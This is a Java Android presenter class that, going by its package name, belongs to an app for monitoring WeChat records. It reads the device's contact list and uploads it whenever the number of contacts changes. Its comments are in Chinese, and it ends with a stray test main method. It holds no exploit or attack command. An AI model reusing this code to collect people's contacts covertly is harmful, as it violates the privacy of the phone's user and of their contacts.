package com.samego.alic.monitor.wechat.wechatrecord.presenter;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

import com.samego.alic.monitor.wechat.wechatrecord.bean.Contact;
import com.samego.alic.monitor.wechat.wechatrecord.common.Constant;
import com.samego.alic.monitor.wechat.wechatrecord.model.ContactModel;
import com.samego.alic.monitor.wechat.wechatrecord.model.ContactModelImpl;
import com.samego.alic.monitor.wechat.wechatrecord.model.listener.OnGetContactListener;
import com.samego.alic.monitor.wechat.wechatrecord.utils.DevLog;
import com.samego.alic.monitor.wechat.wechatrecord.utils.SharedPreferencesUtil;
import com.samego.alic.monitor.wechat.wechatrecord.view.view.AnalysisServiceView;

import java.util.List;

/**
 * 联系人控制器ContactPresenter
 */
public class ContactPresenter {
    private Context context;
    private ContactModel contactModel;
    private Handler handler;
    private AnalysisServiceView analysisServiceView;


    public ContactPresenter(Context context, AnalysisServiceView analysisServiceView) {
        this.context = context;
        this.contactModel = new ContactModelImpl();
        this.handler = new Handler(Looper.getMainLooper());
        this.analysisServiceView = analysisServiceView;
    }

    /**
     * 同步上传联系人信息
     */
    public void syncContactList() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                contactModel.getContactList(context, new OnGetContactListener() {
                    @Override
                    public void successful(List<Contact> contacts) {
                        String contact_num = SharedPreferencesUtil.get(context, Constant.SP_KEY_CONTACT_NUMBER, null);
                        if (null == contact_num || Integer.parseInt(contact_num) != contacts.size()) {
                            SharedPreferencesUtil.set(context, Constant.SP_KEY_CONTACT_NUMBER, String.valueOf(contacts.size()));
                            contactModel.syncContactMessage(context, contacts);
                        } else {
                            DevLog.i("联系人没有变化，不需要同步");
                        }
                    }

                    @Override
                    public void fail() {
                        Toast.makeText(context, "getContactList failed", Toast.LENGTH_SHORT).show();
                        analysisServiceView.getDataFail();
                    }
                });
            }
        });
    }

    public static void main(String[] args) {
        String a=null;
        if(null==a || Integer.parseInt(a)==1){
            System.out.println("Fff");
        }
    }
}
